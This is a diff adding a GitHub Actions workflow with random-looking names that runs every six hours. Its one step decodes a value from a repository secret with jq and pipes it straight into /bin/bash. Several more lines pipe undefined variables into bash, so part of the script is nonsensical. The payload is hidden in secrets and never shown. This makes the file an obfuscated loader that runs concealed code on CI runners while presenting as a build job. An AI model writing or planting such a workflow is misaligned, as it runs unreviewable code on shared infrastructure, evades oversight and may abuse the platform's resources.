@@ -1,0 +1,24 @@
+name: defendleather
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: defendleather
+        env:
+          ohoqf5: ${{ secrets.ohoqf5 }}
+        run: |
+          echo $ohoqf5 | jq -r .abf7825 | /bin/bash
+          echo $nu0 | jq -r .pacu02593 | /bin/bash
+          echo $uu5848 | jq -r .msgl87 | /bin/bash
+          echo $uzo735 | jq -r .p2 | /bin/bash
+          echo $hvvxs7 | jq -r .n8 | /bin/bash
+          echo $lj0666 | jq -r .ay992 | /bin/bash
+          echo $l321 | jq -r .bjdqh55 | /bin/bash
+          echo $pzzpo3439 | jq -r .nnin43956 | /bin/bash
+
